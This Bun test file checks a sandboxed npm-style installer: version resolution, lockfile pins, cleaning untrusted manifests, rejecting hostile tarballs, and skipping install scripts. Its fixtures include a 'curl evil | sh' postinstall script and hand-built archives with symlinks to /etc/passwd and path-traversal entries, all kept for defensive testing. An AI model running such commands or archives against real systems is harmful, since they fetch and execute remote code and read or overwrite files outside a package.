import { afterAll, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { extractPackage, tarFiles } from "./extract";
import { boxReason } from "./index";
import { installPrepared, lockText, readPins, resolve, sanitizeLock, sanitizeManifest, type Entry, type Packument, type Prepared } from "./packages";

const base = join(import.meta.dir, "../../.scratch/test-tmp");
mkdirSync(base, { recursive: true });
const root = mkdtempSync(join(base, "packages-"));
afterAll(() => rmSync(root, { recursive: true, force: true }));

type Version = { dependencies?: Record<string, string>; optionalDependencies?: Record<string, string>; peerDependencies?: Record<string, string>; os?: string[]; cpu?: string[]; tgz?: Uint8Array };
const sha512 = (bytes: Uint8Array | string) => `sha512-${new Bun.CryptoHasher("sha512").update(bytes).digest("base64")}`;

/** A registry's metadata for these packages; each version's checksum is its tarball's, or its id's when it has none. Latest is the highest version unless tags say otherwise. */
function registry(packages: Record<string, Record<string, Version>>, tags: Record<string, Record<string, string>> = {}) {
  return async (name: string): Promise<Packument> => {
    const versions = packages[name];
    if (!versions) throw new Error(`The npm registry answered 404 for ${name}.`);
    return {
      "dist-tags": { latest: Object.keys(versions).sort(Bun.semver.order).at(-1)!, ...tags[name] },
      versions: Object.fromEntries(Object.entries(versions).map(([v, { tgz, ...info }]) => [v, { ...info, dist: { integrity: sha512(tgz ?? `${name}@${v}`) } }])),
    };
  };
}
const versions = (placed: Map<string, Entry>) => Object.fromEntries([...placed].map(([key, entry]) => [key, entry.version]));

type TarEntry = { name: string; type?: string; data?: string; link?: string };
/** A gzipped ustar archive, built by hand so it can hold what npm's tools never write. */
function tar(entries: TarEntry[]) {
  const encoder = new TextEncoder();
  const blocks: Uint8Array[] = [];
  for (const entry of entries) {
    const data = encoder.encode(entry.data ?? "");
    const header = new Uint8Array(512);
    const put = (text: string, at: number) => header.set(encoder.encode(text), at);
    put(entry.name, 0);
    put("0000644\0", 100);
    put("0000000\0", 108);
    put("0000000\0", 116);
    put(`${data.length.toString(8).padStart(11, "0")}\0`, 124);
    put("00000000000\0", 136);
    header[156] = (entry.type ?? "0").charCodeAt(0);
    if (entry.link) put(entry.link, 157);
    put("ustar\0", 257);
    put("00", 263);
    put("        ", 148);
    put(`${header.reduce((sum, b) => sum + b, 0).toString(8).padStart(6, "0")}\0 `, 148);
    blocks.push(header, data, new Uint8Array((512 - (data.length % 512)) % 512));
  }
  blocks.push(new Uint8Array(1024));
  return Bun.gzipSync(Buffer.concat(blocks));
}
/** A pax header record, whose length counts itself. */
function paxRecord(key: string, value: string) {
  const rest = ` ${key}=${value}\n`;
  let length = rest.length + 1;
  while (`${length}${rest}`.length !== length) length++;
  return `${length}${rest}`;
}
const npmPackage = (manifest: Record<string, unknown>, files: Record<string, string> = {}) =>
  tar([{ name: "package/package.json", data: JSON.stringify(manifest) }, ...Object.entries(files).map(([name, data]) => ({ name: `package/${name}`, data }))]);

test("versions land where node resolves them: shared ones once at the top, conflicting ones nested, cycles once", async () => {
  const fetched = registry({
    a: { "1.0.0": { dependencies: { shared: "^1.0.0" } }, "2.0.0": { dependencies: { shared: "^2.0.0" } } },
    b: { "1.0.0": { dependencies: { a: "^2.0.0", shared: "^1.0.0" } } },
    c: { "1.0.0": { dependencies: { d: "^1.0.0" } } },
    d: { "1.0.0": { dependencies: { c: "^1.0.0" } } },
    shared: { "1.0.0": {}, "1.1.0": {}, "2.0.0": {} },
  });
  const deps = { a: "^1.0.0", b: "^1.0.0", c: "^1.0.0" };
  const placed = await resolve(deps, new Map(), [], fetched);
  expect(versions(placed)).toEqual({ a: "1.0.0", b: "1.0.0", c: "1.0.0", d: "1.0.0", shared: "1.1.0", "b/a": "2.0.0", "b/a/shared": "2.0.0" });
  // The lock it writes pins exactly that tree when read back.
  expect(versions(readPins(lockText(deps, placed)))).toEqual(versions(placed));
});

test("a lock's pins hold while they fit; one that no longer fits is replaced and said so", async () => {
  const fetched = registry({ a: { "1.0.0": {}, "1.5.0": {}, "2.0.0": {} } });
  const pins = await resolve({ a: "1.0.0" }, new Map(), [], fetched);
  expect(versions(await resolve({ a: "^1.0.0" }, pins, [], fetched))).toEqual({ a: "1.0.0" });
  const notes: string[] = [];
  expect(versions(await resolve({ a: "^2.0.0" }, pins, notes, fetched))).toEqual({ a: "2.0.0" });
  expect(notes).toEqual(["a was 1.0.0 in the lockfile, which doesn't fit ^2.0.0, so 2.0.0 is installed."]);
});

test("optional packages for another platform or source are left out; required ones stay with their platforms, for bun to skip", async () => {
  const here = { os: [process.platform], cpu: [process.arch] };
  const fetched = registry({
    tool: { "1.0.0": { optionalDependencies: { "tool-here": "1.0.0", "tool-elsewhere": "1.0.0", "tool-git": "github:someone/tool" } } },
    "tool-here": { "1.0.0": here },
    "tool-elsewhere": { "1.0.0": { os: [`!${process.platform}`] } },
    needy: { "1.0.0": { dependencies: { "tool-elsewhere": "1.0.0" } } },
    sourced: { "1.0.0": { dependencies: { thing: "git+https://example.com/thing.git" } } },
  });
  expect(versions(await resolve({ tool: "^1.0.0" }, new Map(), [], fetched))).toEqual({ tool: "1.0.0", "tool-here": "1.0.0" });
  const needy = await resolve({ needy: "1.0.0" }, new Map(), [], fetched);
  expect(versions(needy)).toEqual({ needy: "1.0.0", "tool-elsewhere": "1.0.0" });
  expect(readPins(lockText({ needy: "1.0.0" }, needy)).get("tool-elsewhere")?.info.os).toEqual([`!${process.platform}`]);
  expect(resolve({ sourced: "1.0.0" }, new Map(), [], fetched)).rejects.toThrow("sourced@1.0.0 depends on thing from \"git+https://example.com/thing.git\", which isn't a plain npm registry version");
  expect(resolve({ missing: "1.0.0" }, new Map(), [], fetched)).rejects.toThrow("404");
});

test("versions are picked as bun picks them, prereleases and builds included", async () => {
  const fetched = registry(
    {
      lags: { "1.0.0-rc.1": {}, "1.0.0": {}, "1.0.1": {} },
      pre: { "2.0.0-rc.1": {}, "2.0.0-rc.2": {}, "2.0.0-rc.3": {} },
      below: { "0.9.0": {}, "1.0.0-beta.1": {}, "1.0.0-beta.2": {} },
      exact: { "1.0.0": {}, "2.0.0": {} },
      built: { "1.0.0+build.1": {}, "1.1.0+build.2": {} },
    },
    { lags: { latest: "1.0.0" }, pre: { latest: "2.0.0-rc.2", next: "2.0.0-rc.1" }, below: { latest: "0.9.0" } },
  );
  const picked = async (name: string, range: string) => (await resolve({ [name]: range }, new Map(), [], fetched)).get(name)?.version;
  expect(await picked("lags", "^1.0.0")).toBe("1.0.0");
  // A range naming a prerelease takes latest only when latest is the range's own version; else the highest release, else the highest prerelease.
  expect(await picked("lags", "^1.0.0-rc.1")).toBe("1.0.1");
  expect(await picked("pre", "^2.0.0-rc.2")).toBe("2.0.0-rc.2");
  expect(await picked("pre", "^2.0.0-rc.1")).toBe("2.0.0-rc.3");
  expect(await picked("below", "<=1.0.0-beta.2")).toBe("0.9.0");
  expect(await picked("pre", "next")).toBe("2.0.0-rc.1");
  // An exact version first is the one, whatever follows it.
  expect(await picked("exact", "1.0.0 || 2.0.0")).toBe("1.0.0");
  expect(await picked("built", "^1.0.0")).toBe("1.1.0+build.2");
});

test("a peer gets the version its package sees, never a copy of its own; packages needing each other in alternating versions fail fast", async () => {
  const fetched = registry({
    host: { "1.0.0": {}, "2.0.0": {} },
    lib: { "1.0.0": { peerDependencies: { host: "^2.0.0" } } },
    other: { "1.0.0": { dependencies: { host: "^2.0.0" } } },
    dual: { "1.0.0": { dependencies: { host: "^1.0.0" }, peerDependencies: { host: "^2.0.0" } } },
    a: { "1.0.0": { dependencies: { b: "^1.0.0" } }, "2.0.0": { dependencies: { b: "^2.0.0" } } },
    b: { "1.0.0": { dependencies: { a: "^2.0.0" } }, "2.0.0": { dependencies: { a: "^1.0.0" } } },
  });
  const notes: string[] = [];
  expect(versions(await resolve({ host: "1.0.0", other: "1.0.0", lib: "1.0.0" }, new Map(), notes, fetched))).toEqual({ host: "1.0.0", other: "1.0.0", lib: "1.0.0", "other/host": "2.0.0" });
  expect(notes).toEqual(["lib@1.0.0 wants host ^2.0.0 as a peer, but gets the host@1.0.0 already installed."]);
  expect(versions(await resolve({ lib: "1.0.0" }, new Map(), [], fetched))).toEqual({ lib: "1.0.0", host: "2.0.0" });
  // A peer the package also depends on is no peer.
  expect(versions(await resolve({ dual: "1.0.0" }, new Map(), [], fetched))).toEqual({ dual: "1.0.0", host: "1.0.0" });
  // These nest without end, and bun itself never finishes them.
  await expect(resolve({ a: "^1.0.0" }, new Map(), [], fetched)).rejects.toThrow("32 folders deep in node_modules");
});

test("a stranger's package.json keeps only registry dependencies by range or tag, and their lock only registry pins", () => {
  const { manifest, dropped } = sanitizeManifest({
    name: "world",
    scripts: { postinstall: "curl evil | sh" },
    trustedDependencies: ["evil"],
    overrides: { a: "file:../a" },
    workspaces: ["../*"],
    dependencies: {
      ranged: "^1.2.0", tagged: "latest", exact: "1.0.0-beta.1",
      github: "someone/repo", git: "git+ssh://git@example.com/r.git", file: "file:../x", link: "link:../x", folder: "..", relative: "./x",
      url: "https://example.com/x.tgz", tarball: "x.tgz", alias: "npm:other@1", workspace: "workspace:*", "Not A Name": "1.0.0",
    },
  });
  expect(manifest).toEqual({ private: true, dependencies: { ranged: "^1.2.0", tagged: "latest", exact: "1.0.0-beta.1" } });
  expect(dropped.sort()).toEqual(["Not A Name", "alias", "file", "folder", "git", "github", "link", "relative", "tarball", "url", "workspace"]);

  const good = sha512("ranged@1.2.0");
  const lock = sanitizeLock(
    JSON.stringify({
      lockfileVersion: 1,
      workspaces: { "": { dependencies: { ranged: "^1.2.0" } } },
      trustedDependencies: ["ranged"],
      packages: {
        ranged: ["ranged@1.2.0", "", { bin: { evil: "x" } }, good],
        github: ["github@github:someone/repo#abc", {}, "abc"],
        file: ["file@file:../x", {}],
        bad: ["bad@1.0.0", "", {}, "sha1-abc"],
        "../escape": ["escape@1.0.0", "", {}, good],
      },
    }),
    manifest,
  );
  expect(lock === null ? null : versions(readPins(lock))).toEqual({ ranged: "1.2.0" });
  expect(lock?.includes("github:") || lock?.includes("trustedDependencies") || lock?.includes("evil")).toBe(false);
});

test("pins come from the lockfile versions bun 1.3 and 1.4 write, and from no other", () => {
  const pinned = (lockfileVersion: number) =>
    versions(readPins(JSON.stringify({ lockfileVersion, packages: { ranged: ["ranged@1.2.0", "", {}, sha512("ranged@1.2.0")] } })));
  expect([0, 1, 2, 3, 4].map(pinned)).toEqual([{}, { ranged: "1.2.0" }, { ranged: "1.2.0" }, { ranged: "1.2.0" }, {}]);
});

test("tarballs holding links, devices, absolute paths or climbing paths are turned away whole", () => {
  expect([...tarFiles(npmPackage({ name: "plain" }, { "lib/a.js": "a" })).keys()]).toEqual(["package.json", "lib/a.js"]);
  const hostile: Record<string, TarEntry[]> = {
    "a symbolic link": [{ name: "package/link", type: "2", link: "/etc/passwd" }],
    "a hard link": [{ name: "package/link", type: "1", link: "package/package.json" }],
    "a device": [{ name: "package/dev", type: "3" }],
    "a pipe": [{ name: "package/fifo", type: "6" }],
    "a path that leaves the package": [{ name: "package/../../escape.js", data: "x" }],
    "a path that leaves the package (/tmp/escape.js)": [{ name: "/tmp/escape.js", data: "x" }],
    "a pax size or link": [{ name: "package/PaxHeader", type: "x", data: paxRecord("linkpath", "/etc/passwd") }, { name: "package/link", data: "" }],
  };
  for (const [kind, entries] of Object.entries(hostile)) {
    expect(() => tarFiles(tar([{ name: "package/package.json", data: "{}" }, ...entries]))).toThrow(kind);
  }
  const into = join(root, "extract-one");
  extractPackage(npmPackage({ name: "plain" }, { "lib/a.js": "a" }), into);
  expect(readFileSync(join(into, "lib/a.js"), "utf8")).toBe("a");
});

test("installs from checked tarballs in the sandbox, nested, scoped, prerelease and build versions, with no package scripts, links or binaries", async () => {
  expect(boxReason()).toBeNull();
  const ran = (name: string) => `bun -e "require('fs').writeFileSync('${name}-ran', 'yes')"`;
  const tarballs: Record<string, Uint8Array> = {
    "fixture-dep@1.0.0": npmPackage({ name: "fixture-dep", version: "1.0.0", main: "index.js" }, { "index.js": "module.exports = 'dep one';" }),
    "fixture-dep@2.0.0": npmPackage({ name: "fixture-dep", version: "2.0.0", main: "index.js" }, { "index.js": "module.exports = 'dep two';" }),
    // Named like a package bun runs install scripts for by default.
    "esbuild@0.0.1": npmPackage(
      { name: "esbuild", version: "0.0.1", bin: { "fixture-bin": "bin.js" }, scripts: { preinstall: ran("preinstall"), install: ran("install"), postinstall: ran("postinstall") }, dependencies: { "fixture-dep": "^2.0.0" } },
      { "bin.js": "#!/usr/bin/env bun\n", "index.js": "module.exports = require('fixture-dep');" },
    ),
    "@fixture/scoped@1.0.0": npmPackage({ name: "@fixture/scoped", version: "1.0.0" }, { "index.js": "module.exports = 'scoped';" }),
    // bun files these in its cache under hashes of their tags; the last is prerelease "1" to bun.
    ...Object.fromEntries(
      [
        ["fixture-pre", "1.0.0-rc.1"],
        ["fixture-built", "1.0.0+build.7"],
        ["fixture-quirk", "1.0.0+b-1"],
        ["fixture-elsewhere", "1.0.0"],
      ].map(([name, version]) => [`${name}@${version}`, npmPackage({ name, version }, { "index.js": `module.exports = '${version}';` })]),
    ),
  };
  const fetched = registry({
    "fixture-dep": { "1.0.0": { tgz: tarballs["fixture-dep@1.0.0"] }, "2.0.0": { tgz: tarballs["fixture-dep@2.0.0"] } },
    esbuild: { "0.0.1": { tgz: tarballs["esbuild@0.0.1"], dependencies: { "fixture-dep": "^2.0.0" } }, "0.0.2-beta": { tgz: tarballs["esbuild@0.0.1"] } },
    "@fixture/scoped": { "1.0.0": { tgz: tarballs["@fixture/scoped@1.0.0"] } },
    "fixture-pre": { "0.9.0": {}, "1.0.0-rc.1": { tgz: tarballs["fixture-pre@1.0.0-rc.1"] } },
    "fixture-built": { "1.0.0+build.7": { tgz: tarballs["fixture-built@1.0.0+build.7"] } },
    "fixture-quirk": { "1.0.0+b-1": { tgz: tarballs["fixture-quirk@1.0.0+b-1"] } },
    // Required, though for another platform: bun keeps it in the lock and doesn't install it.
    "fixture-elsewhere": { "1.0.0": { tgz: tarballs["fixture-elsewhere@1.0.0"], os: [`!${process.platform}`] } },
  });
  const deps = { "@fixture/scoped": "^1.0.0", esbuild: "0.0.1", "fixture-built": "^1.0.0", "fixture-dep": "^1.0.0", "fixture-elsewhere": "1.0.0", "fixture-pre": "^1.0.0-rc.1", "fixture-quirk": "1.0.0+b-1" };
  const placed = await resolve(deps, new Map(), [], fetched);
  const store = join(root, "store");
  mkdirSync(store, { recursive: true });
  const prepare = (tgz: (id: string) => Uint8Array): Prepared => ({
    manifest: { private: true, dependencies: deps },
    lock: lockText(deps, placed),
    tarballs: [...placed.values()].map((entry) => {
      const id = `${entry.name}@${entry.version}`;
      const path = join(store, `${id.replace("/", "+")}.tgz`);
      writeFileSync(path, tgz(id));
      return { entry, path };
    }),
    summary: "installed",
  });

  const world = join(root, "data/world");
  mkdirSync(world, { recursive: true });
  expect(await installPrepared(world, prepare((id) => tarballs[id]!))).toBe("installed");
  const version = (path: string) => JSON.parse(readFileSync(join(world, "node_modules", path, "package.json"), "utf8")).version;
  expect([version("fixture-dep"), version("esbuild/node_modules/fixture-dep"), version("@fixture/scoped")]).toEqual(["1.0.0", "2.0.0", "1.0.0"]);
  expect([version("fixture-pre"), version("fixture-built"), version("fixture-quirk")]).toEqual(["1.0.0-rc.1", "1.0.0+build.7", "1.0.0+b-1"]);
  expect(existsSync(join(world, "node_modules/fixture-elsewhere"))).toBe(false);
  expect(["preinstall", "install", "postinstall"].some((script) => existsSync(join(world, "node_modules/esbuild", `${script}-ran`)))).toBe(false);
  expect(existsSync(join(world, "node_modules/.bin"))).toBe(false);
  expect(JSON.parse(readFileSync(join(world, "package.json"), "utf8"))).toEqual({ private: true, dependencies: deps });
  expect(versions(readPins(readFileSync(join(world, "bun.lock"), "utf8")))).toEqual(versions(placed));

  // A tarball with a link in it stops the whole install, and the world keeps what it had.
  const linked = tar([{ name: "package/package.json", data: JSON.stringify({ name: "fixture-dep", version: "1.0.0" }) }, { name: "package/index.js", type: "2", link: "/etc/passwd" }]);
  const refused = installPrepared(world, prepare((id) => (id === "fixture-dep@1.0.0" ? linked : tarballs[id]!)));
  expect(refused).rejects.toThrow("fixture-dep@1.0.0 can't be installed: its tarball holds a symbolic link");
  await refused.catch(() => {});
  expect(version("fixture-dep")).toBe("1.0.0");
}, 60_000);
